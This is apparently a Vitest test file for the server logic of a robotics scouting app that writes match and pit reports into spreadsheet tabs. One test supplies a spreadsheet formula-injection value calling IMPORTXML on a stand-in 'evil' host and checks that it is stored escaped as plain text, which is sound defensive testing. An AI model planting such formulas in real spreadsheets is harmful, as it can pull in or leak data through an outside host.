import { beforeEach, describe, expect, it } from 'vitest';
import type { MatchReport, PitReport, ScriptResponse } from '../shared/contract';
import { handleRequest, METADATA_COLUMNS, REPORT_TABS } from './logic';
import { MemoryPort } from './memoryPort';

const ACCESS_CODE = 'team-code';
const NOW = new Date('2026-10-16T13:00:00Z');
const EVENT_SHEET = 'sheet-2026test';

let port: MemoryPort;

function send(body: unknown, secrets = { accessCode: ACCESS_CODE as string | null }): ScriptResponse {
  return handleRequest(typeof body === 'string' ? body : JSON.stringify(body), port, secrets, NOW);
}

function upload(...reports: unknown[]) {
  const response = send({ action: 'upload', accessCode: ACCESS_CODE, reports });
  if (!response.ok || !('outcomes' in response)) throw new Error(`Upload failed: ${JSON.stringify(response)}`);
  return response.outcomes;
}

function matchReport(overrides: Partial<MatchReport> = {}): MatchReport {
  return {
    id: 'r1',
    kind: 'match',
    eventKey: '2026test',
    scoutId: null,
    configVersion: 1,
    status: 'complete',
    voided: false,
    createdAt: '2026-10-16T12:00:00.000Z',
    updatedAt: '2026-10-16T12:05:00.000Z',
    answers: { tele_scored: 3 },
    matchNumber: 12,
    station: 'Blue 2',
    teamNumber: 578,
    ...overrides,
  };
}

const matchRows = () => port.rows(EVENT_SHEET, REPORT_TABS.match);

beforeEach(() => {
  port = new MemoryPort();
  port.seasonTabs.set('Settings', [
    ['Setting', 'Value'],
    ['Current event', '2026test'],
  ]);
  port.seasonTabs.set('Events', [
    ['Event key', 'Event Sheet ID'],
    ['2026test', EVENT_SHEET],
  ]);
  port.eventSheets.set(EVENT_SHEET, new Map());
});

describe('access', () => {
  it('rejects a wrong access code', () => {
    expect(send({ action: 'upload', accessCode: 'guess', reports: [matchReport()] })).toEqual({
      ok: false,
      error: 'Wrong access code',
    });
    expect(port.eventSheets.get(EVENT_SHEET)!.size).toBe(0);
  });

  it('refuses everything until an Admin sets the ACCESS_CODE property', () => {
    const response = send({ action: 'upload', accessCode: '', reports: [] }, { accessCode: null });
    expect(response).toMatchObject({ ok: false, error: expect.stringContaining('ACCESS_CODE') });
  });

  it('rejects a body that is not JSON, and unknown actions', () => {
    expect(send('not json')).toMatchObject({ ok: false });
    expect(send({ action: 'delete-everything', accessCode: ACCESS_CODE })).toMatchObject({ ok: false });
  });
});

describe('Event Bundle', () => {
  it('names the current event from the Settings tab', () => {
    expect(send({ action: 'event-bundle', accessCode: ACCESS_CODE })).toEqual({
      ok: true,
      bundle: { eventKey: '2026test', teams: [], schedule: [], roster: [], coverage: [] },
    });
  });

  it('explains when no current event is set', () => {
    port.seasonTabs.set('Settings', [['Setting', 'Value']]);
    expect(send({ action: 'event-bundle', accessCode: ACCESS_CODE })).toMatchObject({
      ok: false,
      error: expect.stringContaining('No current event'),
    });
  });
});

describe('uploading Reports', () => {
  it('writes the metadata columns, then one column per question code', () => {
    expect(upload(matchReport())).toEqual([{ reportId: 'r1', outcome: 'stored' }]);

    const [header] = port.readEventTab(EVENT_SHEET, REPORT_TABS.match);
    expect(header).toEqual([...METADATA_COLUMNS, 'tele_scored']);
    expect(matchRows()).toEqual([
      {
        'Report ID': 'r1',
        Event: '2026test',
        Kind: 'match',
        Match: 12,
        Station: 'Blue 2',
        Team: 578,
        'Scout ID': '',
        Scout: '',
        'Config version': 1,
        Void: false,
        Created: '2026-10-16T12:00:00.000Z',
        Updated: '2026-10-16T12:05:00.000Z',
        'Uploaded at': '2026-10-16T13:00:00.000Z',
        'Uploaded via': 'device',
        tele_scored: 3,
      },
    ]);
  });

  it('updates the existing row when the same Report is uploaded again', () => {
    upload(matchReport());
    upload(matchReport({ updatedAt: '2026-10-16T12:30:00.000Z', answers: { tele_scored: 5 } }));

    expect(matchRows()).toHaveLength(1);
    expect(matchRows()[0]).toMatchObject({ tele_scored: 5, Updated: '2026-10-16T12:30:00.000Z' });
  });

  it('adds a row for each different Report', () => {
    upload(matchReport({ id: 'r1' }), matchReport({ id: 'r2', station: 'Red 3' }));
    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r1', 'r2']);
  });

  it('appends new question columns and never removes or reorders existing ones', () => {
    upload(matchReport({ id: 'r1', answers: { tele_scored: 1, auto_moved: true } }));
    upload(matchReport({ id: 'r2', configVersion: 2, answers: { tele_scored: 2, end_actions: ['Park', 'Climb'] } }));

    const [header] = port.readEventTab(EVENT_SHEET, REPORT_TABS.match);
    expect(header.slice(METADATA_COLUMNS.length)).toEqual(['tele_scored', 'auto_moved', 'end_actions']);
    expect(matchRows()).toMatchObject([
      { tele_scored: 1, auto_moved: true, end_actions: '' },
      { tele_scored: 2, auto_moved: '', end_actions: 'Park, Climb' },
    ]);
  });

  it('clears the cell of an answer the Report no longer has', () => {
    upload(matchReport({ answers: { tele_scored: 1, notes: 'fast' } }));
    upload(matchReport({ answers: { tele_scored: 1 } }));
    expect(matchRows()[0].notes).toBe('');
  });

  it('stores text that looks like a formula as plain text', () => {
    upload(matchReport({ answers: { notes: '=IMPORTXML("http://evil", "//a")' } }));
    expect(matchRows()[0].notes).toBe(`'=IMPORTXML("http://evil", "//a")`);
  });

  it('routes Pit Reports to the Pit Reports tab', () => {
    const { matchNumber: _m, station: _s, ...base } = matchReport({ id: 'p1', teamNumber: 1511 });
    const pit: PitReport = { ...base, kind: 'pit' };

    upload(pit);

    expect(port.rows(EVENT_SHEET, REPORT_TABS.pit)).toMatchObject([{ 'Report ID': 'p1', Kind: 'pit', Match: '', Team: 1511 }]);
  });

  it('rejects a Report for an unknown event, and still stores the rest', () => {
    const outcomes = upload(matchReport({ id: 'r1', eventKey: '2026nope' }), matchReport({ id: 'r2' }));
    expect(outcomes).toEqual([
      { reportId: 'r1', outcome: 'rejected', reason: 'unknown event key "2026nope"' },
      { reportId: 'r2', outcome: 'stored' },
    ]);
    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r2']);
  });

  it('rejects Drafts and malformed Reports', () => {
    const outcomes = upload(
      matchReport({ id: 'd1', status: 'draft' }),
      matchReport({ id: 'b1', station: 'Green 1' as never }),
      matchReport({ id: 'b2', answers: { 'Bad Code': 1 } }),
      { nonsense: true },
    );
    expect(outcomes.map((o) => o.outcome)).toEqual(['rejected', 'rejected', 'rejected', 'rejected']);
    expect(port.eventSheets.get(EVENT_SHEET)!.size).toBe(0);
  });

  it('routes each Report to its own event’s Event Sheet', () => {
    port.seasonTabs.get('Events')!.push(['2026other', 'sheet-2026other']);
    port.eventSheets.set('sheet-2026other', new Map());

    upload(matchReport({ id: 'r1' }), matchReport({ id: 'r2', eventKey: '2026other' }));

    expect(matchRows().map((r) => r['Report ID'])).toEqual(['r1']);
    expect(port.rows('sheet-2026other', REPORT_TABS.match).map((r) => r['Report ID'])).toEqual(['r2']);
  });
});
